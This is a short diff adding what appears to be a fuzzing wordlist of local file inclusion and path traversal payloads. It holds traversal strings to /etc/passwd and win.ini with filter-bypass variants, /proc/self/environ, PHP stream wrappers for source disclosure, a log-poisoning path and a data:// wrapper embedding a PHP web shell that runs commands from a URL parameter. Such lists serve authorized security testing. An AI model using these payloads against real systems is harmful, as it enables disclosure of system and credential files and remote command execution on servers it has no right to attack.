@@ -1,0 +1,11 @@
+../../../etc/passwd
+....//....//....//etc/passwd
+/etc/passwd
+..\..\..\windows\win.ini
+....\\....\\....\\windows\win.ini
+/proc/self/environ
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain,<?php system($_GET['cmd']);?>
+/var/log/apache2/access.log
+C:\Windows\System32\drivers\etc\hosts
